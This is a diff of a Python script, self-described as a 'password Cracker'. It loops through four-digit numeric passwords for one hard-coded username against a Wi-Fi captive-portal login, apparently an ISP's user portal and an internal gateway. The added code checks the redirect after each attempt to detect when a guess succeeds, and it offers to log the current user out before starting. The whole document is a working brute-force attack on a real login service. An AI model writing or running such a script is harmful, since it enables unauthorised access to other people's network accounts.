@@ -4,8 +4,47 @@ import requests
 base_url = 'http://10.201.21.1'
 username = "23TSFBA023"
 
+def logged_in(password_str=-1):
+    status_response = requests.get(base_url, allow_redirects=False)
+
+    if status_response.status_code == 302:
+        redirect_url = status_response.headers['Location']
+        if redirect_url==base_url+"/status":
+            return True  # Exit the loop if login and status check are successful
+        elif redirect_url==base_url+"/login":
+            # print()
+            if password_str!=-1:
+                print("not connected, checked:", password_str)
+            return False
+        else:
+            final_response = requests.get(redirect_url)
+            print("something is wrong!")
+            print(redirect_url)
+            print(final_response.headers)
+            return None
+
+
 # Loop over the range of passwords
-for password in range(1970, 10000):
+print("Welcome to the password Cracker!\n\n")
+
+# check if user is logged in, if user is logged in prompt to log out.
+if logged_in(): 
+    print("you are logged in!")
+    usr_input = input("Do you want to logout and run the script? type y for yes and n for no:\n")
+    if usr_input.lower()=="y" or usr_input.lower()=="yes":
+        logout = requests.get('http://10.201.21.1/logout?')
+        if not logged_in():
+            print("you are logged out, running the script now!\n\n")
+        else:
+            print("error logging out.")
+            exit
+    else:
+        exit
+
+
+print(f"finding password for {username}\n\n")
+
+for password in range(1978, 10000):
     # First POST request
     otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
     otp_data = {
@@ -49,11 +88,10 @@ for password in range(1970, 10000):
         'magic': ''
     }
 
-
-    status_response = requests.get(f'{base_url}/')
-
-    if "http://10.201.21.1/logout" in str(status_response._content):
+    if logged_in(password_str):
         print(f"Login successful for username: {username}, password: {password_str}")
-        break  # Exit the loop if login and status check are successful
-    else:
-        print("not connected, checked:", password)
+        break
+
+
+
+
